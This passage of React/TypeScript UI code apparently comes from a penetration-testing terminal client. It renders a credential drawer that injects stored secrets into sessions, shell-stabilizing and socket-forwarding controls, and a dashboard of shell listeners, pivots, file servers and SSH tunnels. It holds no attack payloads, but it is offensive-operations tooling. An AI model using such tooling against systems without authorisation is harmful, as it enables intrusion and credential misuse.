                    <span>Host: <strong style={{ color: 'var(--accent-bright)' }}>{activeTab?.title || 'Any'}</strong></span>
                    <span>Eng: <strong style={{ color: '#fbbf24' }}>{activeEngagement?.name || 'Global'}</strong></span>
                  </div>
                  <div className="drawer-filter-bar">
                    <button
                      type="button"
                      className={`drawer-filter-btn ${credDrawerScope === 'host_and_engagement' ? 'active' : ''}`}
                      onClick={() => setCredDrawerScope('host_and_engagement')}
                    >
                      HOST &amp; ENG
                    </button>
                    <button
                      type="button"
                      className={`drawer-filter-btn ${credDrawerScope === 'all' ? 'active' : ''}`}
                      onClick={() => setCredDrawerScope('all')}
                    >
                      ALL ENG POOL
                    </button>
                  </div>
                  <input
                    className="sidebar-search"
                    aria-label="Filter Credentials"
                    placeholder="Search credentials & hashes..."
                    value={credDrawerQuery}
                    onChange={(e) => setCredDrawerQuery(e.target.value)}
                  />
                  <div className="drawer-items-list">
                    {filteredDrawerCreds.length === 0 ? (
                      <div className="drawer-empty-state">
                        <span>No credentials found for this host &amp; engagement.</span>
                        <button
                          type="button"
                          className="cyber-hud-btn btn-primary btn-sm"
                          style={{ marginTop: '0.5rem', display: 'inline-flex', alignItems: 'center', gap: '0.35rem' }}
                          onClick={() => setShowCredStoreModal(true)}
                        >
                          <CyberIcon name="plus" size={12} />
                          <span>Add Credential</span>
                        </button>
                      </div>
                    ) : (
                      filteredDrawerCreds.map((cred: CredentialEntry) => {
                        const secret = cred.secret || cred.username || '';
                        const isHostBound = Boolean(activeHostId && cred.hostId === activeHostId);
                        return (
                          <div key={cred.id} className="drawer-card">
                            <div className="drawer-card-header">
                              <span className="drawer-card-title">{cred.label || cred.username || 'Credential'}</span>
                              <span className="drawer-badge">
                                {isHostBound ? 'HOST' : cred.category?.toUpperCase() || 'PASS'}
                              </span>
                            </div>
                            {cred.username && (
                              <div className="drawer-card-meta">
                                <span>User: <strong>{cred.username}</strong></span>
                              </div>
                            )}
                            <div className="drawer-card-actions">
                              <button
                                type="button"
                                className="drawer-action-btn"
                                onClick={() => {
                                  void navigator.clipboard.writeText(secret);
                                  setStatusMessage(`Copied secret for ${cred.label || cred.username}.`);
                                }}
                                title="Copy secret to clipboard"
                              >
                                <CyberIcon name="copy" size={12} />
                                <span>Copy</span>
                              </button>
                              <button
                                type="button"
                                className="drawer-action-btn"
                                onClick={() => {
                                  if (sessionId) {
                                    void getWailsBindings()?.WriteTerminal?.(sessionId, secret);
                                    setStatusMessage(`Inserted secret into terminal.`);
                                  } else {
                                    setStatusMessage('No active terminal session.');
                                  }
                                }}
                                title="Insert secret into active terminal"
                              >
                                <CyberIcon name="key" size={12} />
                                <span>Insert</span>
                              </button>
                            </div>
                          </div>
                        );
                      })
                    )}
                  </div>
                </div>
              )}
            </>
          )}
        </aside>

        {!sidebarCollapsed && (
          <div
            className={`sidebar-resizer ${isResizingSidebar ? 'resizing' : ''}`}
            onMouseDown={handleSidebarResizeStart}
            role="separator"
            aria-orientation="vertical"
            aria-label="Resize sidebar"
            title="Drag to resize sidebar"
          >
            <button
              type="button"
              className="sidebar-resizer-collapse-btn"
              title="Collapse Sidebar (Ctrl+B)"
              aria-label="Collapse Sidebar"
              onClick={(e) => {
                e.stopPropagation();
                setSidebarCollapsed(true);
              }}
            >
              <CyberIcon name="chevron-left" size={12} />
            </button>
          </div>
        )}

        {tabs.length > 0 && activeTab && activePane ? (
          <section className="terminal-workspace" aria-label="Active Terminal Session">
            <div
              className="tabs-bar"
              role="tablist"
              aria-label="Session Tabs"
              onDragOver={(e) => {
                if (workspaceDragRef.current?.type === 'pane' || workspaceDragItem?.type === 'pane') {
                  e.preventDefault();
                }
              }}
              onDrop={(e) => {
                const payload = workspaceDragRef.current || workspaceDragItem;
                if (payload?.type === 'pane') {
                  e.preventDefault();
                  startWorkspaceDrag(null);
                  handleUndockPaneToTab(payload.tabId, payload.paneId);
                }
              }}
            >
              {groupTabsByHost
                ? (() => {
                  const groupsMap = new Map<
                    string,
                    { key: string; label: string; color: string; tabs: TabItem[] }
                  >();
                  for (const t of tabs) {
                    const key = t.hostId || t.title;
                    const existing = groupsMap.get(key);
                    if (existing) {
                      existing.tabs.push(t);
                    } else {
                      groupsMap.set(key, {
                        key,
                        label: t.title.replace(/\s*\(.*\)$/, ''),
                        color: t.color || getEffectiveHostColor(t.hostId, undefined, t.title),
                        tabs: [t],
                      });
                    }
                  }

                  return Array.from(groupsMap.values()).map((grp) => {
                    const isCollapsed = collapsedHostGroups.has(grp.key);
                    const hasActive = grp.tabs.some((t) => t.id === activeTab.id);
                    return (
                      <div
                        key={grp.key}
                        className="tab-group-container"
                        aria-label={`Host Group ${grp.label}`}
                      >
                        <button
                          type="button"
                          className="tab-group-header"
                          onClick={() => toggleHostGroupCollapse(grp.key)}
                          title={`Toggle collapse for host group ${grp.label}`}
                          aria-label={`Toggle Group ${grp.label}`}
                        >
                          <span
                            className="host-color-dot"
                            style={{ backgroundColor: grp.color }}
                          />
                          <span>{grp.label}</span>
                          <span className="tab-group-badge">{grp.tabs.length}</span>
                          <span className={`tab-group-chevron ${isCollapsed ? 'collapsed' : ''}`}>
                            <CyberIcon name="chevron-down" size={14} />
                          </span>
                        </button>

                        {(!isCollapsed || hasActive) && (
                          <div style={{ display: 'flex', alignItems: 'center', gap: '0.25rem' }}>
                            {(isCollapsed
                              ? grp.tabs.filter((t) => t.id === activeTab.id)
                              : grp.tabs
                            ).map((tab) => {
                              const isActive = tab.id === activeTab.id;
                              const tabPanes = collectPanes(tab.rootNode);
                              const tabColor =
                                tab.color ||
                                getEffectiveHostColor(tab.hostId, undefined, tab.title);
                              return (
                                <div
                                  key={tab.id}
                                  role="tab"
                                  aria-selected={isActive}
                                  aria-label={`Tab ${tab.title}`}
                                  draggable
                                  className={`tab-pill ${isActive ? 'active' : ''}`}
                                  style={{ borderTop: `3px solid ${tabColor}` }}
                                  onDragStart={() => {
                                    setDraggedTabId(tab.id);
                                    startWorkspaceDrag({
                                      type: 'tab',
                                      tabId: tab.id,
                                      title: tab.title,
                                    });
                                  }}
                                  onDragEnd={() => {
                                    setDraggedTabId(null);
                                    startWorkspaceDrag(null);
                                  }}
                                  onDragOver={(e) => e.preventDefault()}
                                  onDrop={(e) => {
                                    e.stopPropagation();
                                    if (draggedTabId && draggedTabId !== tab.id) {
                                      setTabs((prev) =>
                                        reorderTabsLocal(prev, draggedTabId, tab.id)
                                      );
                                    }
                                    setDraggedTabId(null);
                                    startWorkspaceDrag(null);
                                  }}
                                  onClick={() => {
                                    setActiveTabId(tab.id);
                                    const pane =
                                      tabPanes.find((p) => p.id === tab.activePaneId) ||
                                      tabPanes[0];
                                    if (pane) {
                                      setTimeout(
                                        () => focusersRef.current.get(pane.sessionId)?.(),
                                        50
                                      );
                                    }
                                  }}
                                >
                                  <span
                                    className="tab-dot"
                                    style={{
                                      backgroundColor: tabColor,
                                      boxShadow: `0 0 6px ${tabColor}`,
                                    }}
                                  />
                                  <span>{tab.title}</span>
                                  {tabPanes.length > 1 && <small>({tabPanes.length})</small>}
                                  <button
                                    type="button"
                                    className="tab-close-btn"
                                    aria-label={`Close Tab ${tab.title}`}
                                    onClick={(e) => {
                                      e.stopPropagation();
                                      void handleCloseTab(tab.id);
                                    }}
                                  >
                                    ×
                                  </button>
                                </div>
                              );
                            })}
                          </div>
                        )}
                      </div>
                    );
                  });
                })()
                : tabs.map((tab) => {
                  const isActive = tab.id === activeTab.id;
                  const tabPanes = collectPanes(tab.rootNode);
                  const tabColor =
                    tab.color || getEffectiveHostColor(tab.hostId, undefined, tab.title);
                  return (
                    <div
                      key={tab.id}
                      role="tab"
                      aria-selected={isActive}
                      aria-label={`Tab ${tab.title}`}
                      draggable
                      className={`tab-pill ${isActive ? 'active' : ''}`}
                      style={{ borderTop: `3px solid ${tabColor}` }}
                      onDragStart={() => {
                        setDraggedTabId(tab.id);
                        startWorkspaceDrag({
                          type: 'tab',
                          tabId: tab.id,
                          title: tab.title,
                        });
                      }}
                      onDragEnd={() => {
                        setDraggedTabId(null);
                        startWorkspaceDrag(null);
                      }}
                      onDragOver={(e) => e.preventDefault()}
                      onDrop={(e) => {
                        e.stopPropagation();
                        if (draggedTabId && draggedTabId !== tab.id) {
                          setTabs((prev) => reorderTabsLocal(prev, draggedTabId, tab.id));
                        }
                        setDraggedTabId(null);
                        startWorkspaceDrag(null);
                      }}
                      onClick={() => {
                        setActiveTabId(tab.id);
                        const pane =
                          tabPanes.find((p) => p.id === tab.activePaneId) || tabPanes[0];
                        if (pane) {
                          setTimeout(() => focusersRef.current.get(pane.sessionId)?.(), 50);
                        }
                      }}
                    >
                      <span
                        className="tab-dot"
                        style={{
                          backgroundColor: tabColor,
                          boxShadow: `0 0 6px ${tabColor}`,
                        }}
                      />
                      <span>{tab.title}</span>
                      {tabPanes.length > 1 && <small>({tabPanes.length})</small>}
                      <button
                        type="button"
                        className="tab-close-btn"
                        aria-label={`Close Tab ${tab.title}`}
                        onClick={(e) => {
                          e.stopPropagation();
                          void handleCloseTab(tab.id);
                        }}
                      >
                        ×
                      </button>
                    </div>
                  );
                })}
              <div className="tabs-bar-controls">
                <button
                  type="button"
                  className="tab-new-btn"
                  title="Open New Connection Tab"
                  aria-label="New Connection Tab"
                  onClick={handleOpenNewConnectionTab}
                >
                  <CyberIcon name="plus" size={12} />
                </button>
                <button
                  type="button"
                  className={`tab-toggle-btn ${groupTabsByHost ? 'active' : ''}`}
                  title={groupTabsByHost ? 'Switch to ungrouped flat tabs' : 'Group tabs by host'}
                  aria-label={groupTabsByHost ? 'Ungroup Tabs' : 'Group by Host'}
                  onClick={() => setGroupTabsByHost((prev) => !prev)}
                >
                  <span>{groupTabsByHost ? '⊟ Ungroup' : '⊞ Group by Host'}</span>
                </button>
              </div>
            </div>

            {activeTab.tabType !== 'notes' &&
              activeTab.tabType !== 'settings' &&
              activeTab.tabType !== 'sftp' &&
              activeTab.tabType !== 'network-map' &&
              activeTab.tabType !== 'route-health' &&
              activeTab.tabType !== 'api-tester' &&
              activeTab.tabType !== 'hex-runner' &&
              activeTab.tabType !== 'editor' && (
                <div className="terminal-toolbar hud-command-strip">
                  <div className="hud-telemetry-readout" title={statusMessage}>
                    <span className="hud-telemetry-dot" />
                    <span className="hud-telemetry-label">HUD</span>
                    <strong className="hud-telemetry-msg">
                      {activePane.title}
                      {activeTabPanes.length > 1 ? ` · ${activeTabPanes.length} PANES` : ''}
                    </strong>
                  </div>

                  <div className="terminal-toolbar-actions hud-segmented-deck">
                    {/* GROUP 1: Split & Workspace View Builder */}
                    <div className="hud-btn-group">
                      <button
                        type="button"
                        className="hud-seg-btn"
                        aria-label="New Connection Split"
                        onMouseDown={(e) => e.preventDefault()}
                        onClick={() => handleOpenNewConnectionSplit('right')}
                        title="Open a blank New Connection split pane side-by-side"
                      >
                        <CyberIcon name="plus" size={12} />
                        <span>New Split</span>
                      </button>
                      <button
                        type="button"
                        className="hud-seg-btn"
                        aria-label="Split Horizontal"
                        onMouseDown={(e) => e.preventDefault()}
                        onClick={() => void handleSplitPane('horizontal')}
                        title="Split active pane horizontally (side-by-side)"
                      >
                        <CyberIcon name="split-h" size={13} />
                        <span>Split H</span>
                      </button>
                      <button
                        type="button"
                        className="hud-seg-btn"
                        aria-label="Split Vertical"
                        onMouseDown={(e) => e.preventDefault()}
                        onClick={() => void handleSplitPane('vertical')}
                        title="Split active pane vertically (stacked)"
                      >
                        <CyberIcon name="split-v" size={13} />
                        <span>Split V</span>
                      </button>

                      <div className="add-to-view-wrapper" style={{ position: 'relative', display: 'inline-flex' }}>
                        <button
                          type="button"
                          className={`hud-seg-btn ${showAddToViewMenu ? 'active' : ''}`}
                          aria-label="Add to View"
                          aria-expanded={showAddToViewMenu}
                          onMouseDown={(e) => e.preventDefault()}
                          onClick={() => setShowAddToViewMenu((prev) => !prev)}
                          title="Open another host connection, local shell, Notes, TOTP, SFTP, or Snippets side-by-side in this view"
                        >
                          <CyberIcon name="grid" size={13} />
                          <span>+ View</span>
                          <CyberIcon name="chevron-down" size={11} />
                        </button>
                        {showAddToViewMenu && (
                          <div
                            className="add-to-view-popover cyber-glass-popover"
                            role="menu"
                            aria-label="Add to Workspace View Menu"
                          >
                            <div className="add-to-view-section-title">Dock Position</div>
                            <div className="add-to-view-zone-selector">
                              {(
                                [
                                  { zone: 'right', label: 'Right' },
                                  { zone: 'bottom', label: 'Bottom' },
                                  { zone: 'left', label: 'Left' },
                                  { zone: 'top', label: 'Top' },
                                ] as const
                              ).map((item) => (
                                <button
                                  key={item.zone}
                                  type="button"
                                  className={`zone-pill-btn ${addToViewZone === item.zone ? 'active' : ''}`}
                                  onClick={() => setAddToViewZone(item.zone)}
                                >
                                  {item.label}
                                </button>
                              ))}
                            </div>

                            <div className="add-to-view-section-title">
                              Blank Split ({addToViewZone})
                            </div>
                            <button
                              type="button"
                              role="menuitem"
                              className="add-to-view-item"
                              onClick={() => {
                                setShowAddToViewMenu(false);
                                handleOpenNewConnectionSplit(addToViewZone);
                              }}
                            >
                              <CyberIcon name="plus" size={12} />
                              <span style={{ flex: 1, textAlign: 'left', fontWeight: 600 }}>
                                New Connection View
                              </span>
                              <small style={{ color: 'var(--text-muted)' }}>Launcher</small>
                            </button>

                            <div className="add-to-view-section-title">
                              Connect Host into Split ({addToViewZone})
                            </div>
                            {vaultSummary.hosts.length === 0 ? (
                              <div className="add-to-view-empty">No saved hosts in vault yet.</div>
                            ) : (
                              <div className="add-to-view-hosts-list">
                                {vaultSummary.hosts.map((h) => (
                                  <button
                                    key={h.id}
                                    type="button"
                                    role="menuitem"
                                    className="add-to-view-item"
                                    onClick={() => void handleConnectHostIntoSplit(h, addToViewZone)}
                                  >
                                    <span
                                      className="host-color-dot"
                                      style={{
                                        backgroundColor: getEffectiveHostColor(h.id, h.color, h.label),
                                      }}
                                    />
                                    <span style={{ flex: 1, textAlign: 'left', fontWeight: 600 }}>
                                      {h.label}
                                    </span>
                                    <small style={{ color: 'var(--text-muted)' }}>
                                      {h.effectiveUser}@{h.address}
                                    </small>
                                  </button>
                                ))}
                              </div>
                            )}

                            <div className="add-to-view-section-title">
                              Dock Tools &amp; Widgets (Click or Drag)
                            </div>
                            <div className="add-to-view-tools-grid">
                              <button
                                type="button"
                                role="menuitem"
                                className="add-to-view-tool-btn"
                                draggable
                                onDragStart={() =>
                                  startWorkspaceDrag({
                                    type: 'tool',
                                    toolType: 'notes',
                                    hostId: activePane?.hostId || activeTab?.hostId,
                                    title: 'Host Notes',
                                  })
                                }
                                onDragEnd={() => startWorkspaceDrag(null)}
                                onClick={() => void handleDockToolIntoSplit('notes', addToViewZone)}
                              >
                                <CyberIcon name="note" size={12} /> Notes Drawer
                              </button>
                              <button
                                type="button"
                                role="menuitem"
                                className="add-to-view-tool-btn"
                                draggable
                                onDragStart={() =>
                                  startWorkspaceDrag({
                                    type: 'tool',
                                    toolType: 'totp',
                                    title: '2FA / TOTP',
                                  })
                                }
                                onDragEnd={() => startWorkspaceDrag(null)}
                                onClick={() => void handleDockToolIntoSplit('totp', addToViewZone)}
                              >
                                <CyberIcon name="totp" size={12} /> 2FA / TOTP
                              </button>
                              <button
                                type="button"
                                role="menuitem"
                                className="add-to-view-tool-btn"
                                draggable
                                onDragStart={() =>
                                  startWorkspaceDrag({
                                    type: 'tool',
                                    toolType: 'sftp',
                                    hostId: activePane?.hostId || activeTab?.hostId,
                                    title: 'SFTP Browser',
                                  })
                                }
                                onDragEnd={() => startWorkspaceDrag(null)}
                                onClick={() => void handleDockToolIntoSplit('sftp', addToViewZone)}
                              >
                                <CyberIcon name="folder" size={12} /> SFTP Browser
                              </button>
                              <button
                                type="button"
                                role="menuitem"
                                className="add-to-view-tool-btn"
                                draggable
                                onDragStart={() =>
                                  startWorkspaceDrag({
                                    type: 'tool',
                                    toolType: 'snippets',
                                    title: 'Command Snippets',
                                  })
                                }
                                onDragEnd={() => startWorkspaceDrag(null)}
                                onClick={() => void handleDockToolIntoSplit('snippets', addToViewZone)}
                              >
                                <CyberIcon name="bolt" size={12} /> Snippets
                              </button>
                              <button
                                type="button"
                                role="menuitem"
                                className="add-to-view-tool-btn"
                                draggable
                                onDragStart={() =>
                                  startWorkspaceDrag({
                                    type: 'tool',
                                    toolType: 'network-map',
                                    title: 'Network Topology Map',
                                  })
                                }
                                onDragEnd={() => startWorkspaceDrag(null)}
                                onClick={() => void handleDockToolIntoSplit('network-map', addToViewZone)}
                              >
                                <CyberIcon name="network" size={12} /> Network Map
                              </button>
                              <button
                                type="button"
                                role="menuitem"
                                className="add-to-view-tool-btn"
                                onClick={() =>
                                  void handleDockToolIntoSplit('local-powershell', addToViewZone)
                                }
                              >
                                <CyberIcon name="terminal" size={12} /> Local PowerShell
                              </button>
                              <button
                                type="button"
                                role="menuitem"
                                className="add-to-view-tool-btn"
                                onClick={() =>
                                  void handleDockToolIntoSplit('local-bash', addToViewZone)
                                }
                              >
                                <CyberIcon name="terminal" size={12} /> Local Bash / WSL
                              </button>
                            </div>

                            {activeTabPanes.length > 1 && (
                              <>
                                <div className="add-to-view-section-title">Workspace Layout</div>
                                <button
                                  type="button"
                                  role="menuitem"
                                  className="add-to-view-item"
                                  onClick={handleEqualizeAllSplits}
                                >
                                  <CyberIcon name="grid" size={12} />
                                  <span>Equalize All Split Proportions</span>
                                </button>
                              </>
                            )}
                          </div>
                        )}
                      </div>

                      {activeTabPanes.length > 1 && (
                        <button
                          type="button"
                          className="hud-seg-btn"
                          aria-label="Next Pane"
                          onMouseDown={(e) => e.preventDefault()}
                          onClick={handleCyclePaneFocus}
                          title="Cycle keyboard focus to the next split pane (Alt+ArrowDown)"
                        >
                          <CyberIcon name="next-pane" size={13} />
                        </button>
                      )}
                    </div>

                    {/* GROUP 2: Directory & Root Shell Spawner */}
                    <div className="hud-btn-group">
                      <button
                        type="button"
                        className="hud-seg-btn"
                        aria-label="New Terminal Default Directory"
                        onMouseDown={(e) => e.preventDefault()}
                        onClick={() => void handleOpenTerminalDirectory('default')}
                        title="Open new terminal in default working directory"
                      >
                        <CyberIcon name="home" size={12} />
                        <span>~ Dir</span>
                      </button>
                      <button
                        type="button"
                        className="hud-seg-btn"
                        aria-label="New Terminal Current Directory"
                        onMouseDown={(e) => e.preventDefault()}
                        onClick={() => void handleOpenTerminalDirectory('current')}
                        title="Open new terminal in current working directory (CWD)"
                      >
                        <CyberIcon name="folder" size={12} />
                        <span>CWD</span>
                      </button>
                      <button
                        type="button"
                        className="hud-seg-btn"
                        aria-label="New Terminal Root in Current Directory"
                        onMouseDown={(e) => e.preventDefault()}
                        onClick={() => void handleOpenTerminalDirectory('root')}
                        title="Open new root / elevated terminal in current working directory"
                      >
                        <CyberIcon name="bolt" size={12} />
                        <span>Root</span>
                      </button>
                    </div>

                    {/* GROUP 3: Security Ops & Shell Upgrade */}
                    <div className="hud-btn-group">
                      <button
                        type="button"
                        className="hud-seg-btn"
                        aria-label="Inject Password"
                        onMouseDown={(e) => e.preventDefault()}
                        onClick={() => void handleInjectPassword()}
                        title="Injects the stored password directly from the Go Vault into the terminal without pressing Enter"
                      >
                        <CyberIcon name="key" size={12} />
                        <span>Pass</span>
                      </button>
                      <button
                        type="button"
                        className="hud-seg-btn"
                        aria-label="Stabilize Shell"
                        onMouseDown={(e) => e.preventDefault()}
                        onClick={handleOpenShellStabilize}
                        title="Upgrade raw/dumb shell to a full interactive PTY terminal"
                      >
                        <CyberIcon name="stabilize" size={12} />
                        <span>Stabilize</span>
                      </button>
                      <button
                        type="button"
                        className="hud-seg-btn"
                        aria-label="Remote Listening Sockets"
                        onMouseDown={(e) => e.preventDefault()}
                        onClick={() => setShowRemoteSocketsModal(true)}
                        title="Scan listening sockets on active SSH host & 1-click -L forward (F-45)"
                      >
                        <CyberIcon name="tunnel" size={12} />
                        <span>Sockets</span>
                      </button>
                    </div>

                    <button
                      type="button"
                      className="btn-danger btn-sm hud-disconnect-btn"
                      onClick={() => void handleDisconnect()}
                    >
                      Disconnect
                    </button>
                  </div>
                </div>
              )}

            <div className="workspace-tabs-content" aria-label="Terminal Split Grid">
              {tabs.map((tab) => {
                const isCurrentTab = tab.id === activeTab.id;
                const tabPanes = collectPanes(tab.rootNode);
                return (
                  <div
                    key={tab.id}
                    className="tab-content-panel"
                    style={{ display: isCurrentTab ? 'flex' : 'none', height: '100%', flexDirection: 'column' }}
                    aria-hidden={!isCurrentTab}
                  >
                    {tab.tabType === 'sftp' ? (
                      <SftpBrowserView
                        sessionId={tab.sftpSessionId || (tab.rootNode.type === 'pane' ? tab.rootNode.sessionId.replace('sftp-', '') : '')}
                        hostLabel={tab.title.replace('SFTP: ', '')}
                        api={{
                          listLocalDir: (p) => getWailsBindings()?.ListLocalDir?.(p) ?? Promise.resolve([]),
                          listRemoteDir: (sid, p) => getWailsBindings()?.ListRemoteDir?.(sid, p) ?? Promise.resolve([]),
                          startSftpUpload: (sid, l, r) => getWailsBindings()?.StartSftpUpload?.(sid, l, r) ?? Promise.resolve(''),
                          startSftpDownload: (sid, r, l) => getWailsBindings()?.StartSftpDownload?.(sid, r, l) ?? Promise.resolve(''),
                          createRemoteDir: (sid, p) => getWailsBindings()?.CreateRemoteDir?.(sid, p) ?? Promise.resolve(),
                          deleteRemoteItem: (sid, p) => getWailsBindings()?.DeleteRemoteItem?.(sid, p) ?? Promise.resolve(),
                          cancelTransfer: (tid) => getWailsBindings()?.CancelTransfer?.(tid) ?? Promise.resolve(),
                          getActiveTransfers: () => getWailsBindings()?.GetActiveTransfers?.() ?? Promise.resolve([]),
                          startRemoteEdit: (sid, p) =>
                            getWailsBindings()?.StartRemoteEdit?.(sid, p) ??
                            Promise.reject(new Error('StartRemoteEdit unavailable')),
                        }}
                        eventsOn={getWailsRuntime()?.EventsOn}
                        onClose={() => void handleCloseTab(tab.id)}
                        onOpenRemoteEdit={(sess) => {
                          openRemoteEditorTab(sess, tab.hostId);
                        }}
                      />
                    ) : tab.tabType === 'settings' ? (
                      <SettingsView
                        activeTab={settingsActiveTab}
                        onTabChange={setSettingsActiveTab}
                        globalSettings={globalSettings}
                        onUpdateSettings={handleUpdateSettings}
                        onResetSettings={handleResetSettings}
                        vaultLocked={vaultLocked}
                        passwordless={passwordless}
                        helloPending={helloPending}
                        quickUnlockReady={quickUnlockReady}
                        modalError={modalError}
                        onEnableQuickUnlock={handleEnableQuickUnlock}
                        onChangePassword={handleChangePasswordDirect}
                        onResetVault={handleResetVault}
                        availableSnippets={vaultSummary.snippets || []}
                        syncInfo={syncInfo}
                        onRefreshSync={refreshSyncInfo}
                        onOpenSSHConfigImport={() => {
                          setModalError('');
                          setSshConfigResult(null);
                          setShowSSHConfigModal(true);
                        }}
                        onOpenPuttyTermiusImport={() => {
                          setShowImportModal(true);
                        }}
                        onOpenConflictResolver={(rep, file) => {
                          setActiveConflictReport(rep);
                          setActiveConflictFilePath(file);
                          setShowConflictModal(true);
                        }}
                        onOpenToolForManagedFile={openToolForManagedFile}
                        isModal={false}
                      />
                    ) : tab.tabType === 'notes' ? (
                      <NotesView
                        notes={notes}
                        hosts={vaultSummary.hosts.map((h) => ({
                          id: h.id,
                          label: h.label,
                          address: h.address,
                        }))}
                        activeHostId={tab.notesHostId}
                        initialNoteId={tab.notesInitialNoteId}
                        onSaveNote={handleSaveNote}
                        onDeleteNote={handleDeleteNote}
                        onClose={() => void handleCloseTab(tab.id)}
                      />
                    ) : tab.tabType === 'winrm' ? (
                      renderWinrmManager(true, () => void handleCloseTab(tab.id), tab.id)
                    ) : tab.tabType === 'route-health' ? (
                      <RouteHealthModal
                        isView={true}
                        onClose={() => void handleCloseTab(tab.id)}
                        activeEngagementId={activeEngagement?.id || null}
                        activeEngagementName={activeEngagement?.name || null}
                        socksCandidates={(() => {
                          const list: SocksCandidateOption[] = [];
                          for (const tun of activeTunnels) {
                            if (tun.type === 'D' && tun.status === 'active') {
                              const host =
                                !tun.bindAddress || tun.bindAddress === '0.0.0.0' || tun.bindAddress === '::'
                                  ? '127.0.0.1'
                                  : tun.bindAddress;
                              list.push({ label: `SSH -D`, addr: `${host}:${tun.bindPort}` });
                            }
                          }
                          for (const p of vaultSummary.proxyProfiles || []) {
                            if (p.type === 'socks5' && p.socksAddress) {
                              if (!list.some((x) => x.addr === p.socksAddress)) {
                                list.push({ label: p.name, addr: p.socksAddress });
                              }
                            }
                          }
                          return list;
                        })()}
                        suggestedTargetHosts={vaultSummary.hosts.map((h) => h.address).filter(Boolean)}
                        activeDashboardItems={(() => {
                          const items: DashboardListenerSnapshot[] = [];
                          for (const l of drawerListeners) {
                            items.push({
                              id: l.id,
                              sourceType: 'shell-listener',
                              name: l.name,
                              kind: `${l.tool} (${l.kind})`,
                              endpoint: `${l.bindAddress}:${l.bindPort}`,
                              status: l.status,
                              metaSummary: `Catches: ${l.catchCount || 0}`,
                            });
                          }
                          for (const srv of dashboardFileServers) {
                            items.push({
                              id: srv.id,
                              sourceType: 'transfer-server',
                              name: srv.name,
                              kind: srv.kind,
                              endpoint: `${srv.bindAddress}:${srv.port}`,
                              status: srv.status,
                              metaSummary: `Served: ${srv.servedCount || 0} · Uploads: ${srv.uploadCount || 0}`,
                            });
                          }
                          for (const p of drawerPivots) {
                            if (p.status === 'running') {
                              items.push({
                                id: p.id,
                                sourceType: 'pivot',
                                name: p.name,
                                kind: p.tool,
                                endpoint: p.listenPort ? `${p.bindAddress}:${p.listenPort}` : p.tool,
                                status: p.status,
                              });
                            }
                          }
                          for (const t of activeTunnels) {
                            if (t.status === 'active') {
                              items.push({
                                id: t.id,
                                sourceType: 'ssh-tunnel',
                                name: `SSH -${t.type} :${t.bindPort}`,
                                kind: `-${t.type}`,
                                endpoint: `${t.bindAddress || '127.0.0.1'}:${t.bindPort}`,
                                status: t.status,
                              });
                            }
                          }
                          return items;
                        })()}
                        onRefreshEndpoints={refreshRouteHealthEndpoints}
                        onStopEndpoint={async (sourceType, id) => {
                          const api = getWailsBindings();
                          if (!api) return;
                          if (sourceType === 'shell-listener' && api.StopManagedListener) {
                            await api.StopManagedListener(id);
                            setDrawerListeners((prev) => prev.filter((x) => x.id !== id));
                          } else if (sourceType === 'transfer-server' && api.StopFileTransferServer) {
                            await api.StopFileTransferServer(id);
                            setDashboardFileServers((prev) => prev.filter((x) => x.id !== id));
                          } else if (sourceType === 'pivot' && api.StopPivotInstance) {
                            await api.StopPivotInstance(id);
                            setDrawerPivots((prev) => prev.filter((x) => x.id !== id));
                          } else if (sourceType === 'ssh-tunnel' && api.StopForwardTunnel) {
                            await api.StopForwardTunnel(id);
                            if (api.GetActiveTunnels) {
                              const tuns = await api.GetActiveTunnels();
                              setActiveTunnels(tuns || []);
                            }
                          }
                        }}
                        runHealthCheck={async (req) => {
                          const api = getWailsBindings();
                          if (api?.RunRouteHealthCheck) return api.RunRouteHealthCheck(req);
                          throw new Error('RunRouteHealthCheck API unavailable');
                        }}
                        onOpenPivotManager={() => setShowPivotManagerModal(true)}
                        onOpenPortForwarding={() => setShowPortForwardingModal(true)}
                      />
                    ) : tab.tabType === 'api-tester' ? (
                      <ApiTesterView
                        activeEngagementId={activeEngagement?.id || null}
                        activeEngagementName={activeEngagement?.name || null}
                        identities={vaultSummary.identities || []}
                        externalDraft={apiTesterDraft}
                        onExternalDraftConsumed={() => setApiTesterDraft(null)}
                        eventsOn={getWailsRuntime()?.EventsOn}
                        onSaveToEvidence={async (title, category, content) => {
                          await handleSaveSelectionEvidence({
                            id: `ev-api-${Date.now()}`,
                            engagementId: activeEngagement?.id || '',
                            category,
                            title,
                            type: 'text',
                            content,
                            source: 'api-tester',
                            inReport: true,
                            severity: 'info',
                            capturedAt: new Date().toISOString(),
                          });
                        }}
                        onSaveToNotes={async (title, content) => {
                          const now = new Date().toISOString();
                          await handleSaveSelectionNote({
                            id: `note-api-${Date.now()}`,
                            hostId: '',
                            engagementId: activeEngagement?.id || '',
                            parentId: '',
                            isFolder: false,
                            title,
                            type: 'markdown',
                            body: content,
                            order: 0,
                            createdAt: now,
                            updatedAt: now,
                          });
                        }}
                        onClose={() => void handleCloseTab(tab.id)}
                      />
                    ) : tab.tabType === 'hex-runner' ? (
                      <HexRunnerView
                        activeEngagementId={activeEngagement?.id || null}
                        activeEngagementName={activeEngagement?.name || null}
                        sshSessions={tabs.flatMap((t) =>
                          collectPanes(t.rootNode)
                            .filter(
                              (p) =>
                                Boolean(p.hostId) &&
                                !p.paneType &&
                                !p.isRawTcp &&
                                !p.sessionId.startsWith('local-') &&
                                !p.sessionId.startsWith('serial-') &&
                                !p.sessionId.startsWith('winrm-') &&
                                !p.sessionId.startsWith('rawtcp-')
                            )
                            .map((p) => ({ id: p.sessionId, label: `${p.title} (${p.sessionId.slice(0, 8)})` }))
                        )}
                        rawTcpSessions={tabs.flatMap((t) =>
                          collectPanes(t.rootNode)
                            .filter((p) => Boolean(p.isRawTcp || p.sessionId.startsWith('rawtcp-')))
                            .map((p) => ({
                              id: p.sessionId,
                              label: p.rawTcpHost ? `${p.rawTcpHost}:${p.rawTcpPort ?? ''}` : p.title,
                            }))
                        )}
                        onSendToApiTester={(draft) => {
                          setApiTesterDraft({
                            id: `req-hex-${Date.now()}`,
                            engagementId: activeEngagement?.id || undefined,
                            collectionName: 'Default Collection',
                            name: draft.name,
                            method: 'POST',
                            url: 'http://127.0.0.1:8080/binary',
                            params: [],
                            headers: [{ key: 'Content-Type', value: 'application/octet-stream', enabled: true }],
                            auth: { type: 'none' },
                            bodyType: 'hex',
                            body: draft.body,
                            rawMode: false,
                            rawRequest: '',
                            routeId: '',
                            timeoutSec: 20,
                            followRedirects: true,
                            useCookieJar: true,
                            tlsSkipVerify: false,
                          });
                          openApiTesterTab();
                        }}
                        onSendToApiWs={(draft) => {
